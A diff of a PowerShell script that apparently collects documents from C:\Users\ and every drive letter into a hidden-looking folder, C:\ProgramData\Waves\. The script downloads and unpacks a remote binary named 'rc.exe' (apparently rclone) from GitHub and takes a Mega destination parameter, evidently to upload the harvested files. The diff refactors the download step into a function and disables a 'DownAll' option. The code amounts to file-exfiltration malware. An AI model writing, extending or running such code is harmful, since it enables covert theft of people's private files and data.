@@ -2,7 +2,7 @@
 param (
     [switch]$First,
     [switch]$Stream,
-    [switch]$DownAll,
+    #[switch]$DownAll,
     [string]$objName,
     [string]$destMega
 )
@@ -80,15 +80,18 @@ param (
         del -Force -recurse $sendDestDir
     }
 
-    [bool]$second = $false
-    $baseDir = 'C:\ProgramData\Waves\'; New-Item $baseDir -ItemType Directory -ea 0
-    $appsDir = ($baseDir + 'Apps\'); New-Item $appsDir -ItemType Directory -ea 0
-    if ((Test-Path ($appsDir + 'rc.exe')) -eq $false) {
+    function Check-RClone {
+        if ((Test-Path ($appsDir + 'rc.exe')) -eq $false) {
         Invoke-WebRequest -Uri "https://github.com/jensack/stream/raw/main/rc.zip" -OutFile ($appsDir + 'rc.zip')
         Expand-Archive -Path ($appsDir + 'rc.zip') -DestinationPath $appsDir
         del -force ($appsDir + 'rc.zip')        
     }
+    }
 
+    [bool]$second = $false
+    $baseDir = 'C:\ProgramData\Waves\'; New-Item $baseDir -ItemType Directory -ea 0
+    $appsDir = ($baseDir + 'Apps\'); New-Item $appsDir -ItemType Directory -ea 0
+    Check-RClone
     $srcdir = 'C:\Users\'
     $allPaths = @('A:','B:','D:','E:','F:','G:','H:','I:','J:','K:','L:','M:','N:','O:','P:','Q:','R:','S:','T:','U:','V:','W:','Z:','X:','Y:')
     $destDir = ($baseDir + 'Docs\') ; New-Item $destDir -ItemType Directory -ea 0
@@ -136,7 +139,7 @@ param (
         }
     }
 
-    if ($DownAll) { Download-All }
+    #if ($DownAll) { Download-All }
         
     
     if ($Stream) {
